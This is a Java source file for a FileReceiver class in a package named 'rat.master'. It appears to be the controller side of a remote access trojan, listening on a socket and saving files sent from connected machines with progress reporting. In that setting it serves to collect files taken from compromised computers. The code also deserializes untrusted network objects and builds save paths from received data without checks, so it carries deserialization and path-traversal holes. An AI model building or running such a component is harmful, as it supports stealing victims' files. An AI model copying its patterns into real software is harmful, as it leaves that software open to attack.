package rat.master;

import rat.packets.FileDataPacket;
import rat.utils.FileManager;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class FileReceiver extends Thread {

    private List<FileReceiverObserver> observerList = new ArrayList<>();

    private volatile boolean active;

    private ServerSocket serverSocket;

    public FileReceiver() {
        this.active = true;

        try {
            serverSocket = new ServerSocket(0);
        } catch (IOException e) {
            e.printStackTrace();
            active = false;
        }
    }

    @Override
    public void run() {
        byte[] bytes = new byte[4096];

        while (isActive()) {
            try (Socket socket = serverSocket.accept()) {

                /* Read FileDataPacket first */
                ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                FileDataPacket fileDataPacket = (FileDataPacket) ois.readObject();

                String savePath = new File(".").getCanonicalPath();
                String packetPath = FileManager.extractRelativePath(fileDataPacket, !savePath.endsWith(File.separator));

                File file = new File(savePath + packetPath);
                if (!file.getParentFile().exists()) {
                    file.getParentFile().mkdirs();
                }

                InputStream in = socket.getInputStream();
                OutputStream out = new FileOutputStream(file.getAbsolutePath());

                long currentCount = 0;
                int count;

                long previousTime = System.nanoTime();
                long currentTime;
                long tmpCount = 0;

                while ((count = in.read(bytes)) > 0) {
                    out.write(bytes, 0, count);
                    currentCount += count;
                    tmpCount += count;

                    try {
                        Thread.sleep(100); // 0.1s
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    if (((currentCount * 100) / fileDataPacket.getTotalSize()) % 5 == 0) {
                        currentTime = System.nanoTime();
                        double timeDiff = (currentTime - previousTime) / 1e9;
                        double downloadSpeed = (tmpCount / 1024.0) / timeDiff;

                        notifyObservers(fileDataPacket, currentCount, downloadSpeed);

                        tmpCount = 0;
                        previousTime = currentTime;
                    }
                }

                out.close();

            } catch (IOException | ClassNotFoundException ex) {
                ex.printStackTrace();
            }
        }

    }

    public int getPort() {
        return serverSocket.getLocalPort();
    }

    public void register(FileReceiverObserver observer) {
        observerList.add(Objects.requireNonNull(observer));
    }

    public void unregister(FileReceiverObserver observer) {
        observerList.remove(observer);
    }

    private void notifyObservers(FileDataPacket dataPacket, long count, double downloadSpeed) {
        List<FileReceiverObserver> tmp = new ArrayList<>(observerList);
        for (FileReceiverObserver observer : tmp) {
            observer.updateProgress(dataPacket, count, downloadSpeed);
        }
    }

    public boolean isActive() {
        return active;
    }

    public void finish() {
        if (serverSocket != null) {
            try {
                serverSocket.close();
            } catch (IOException e) {
            }
        }
        this.active = false;
    }
}
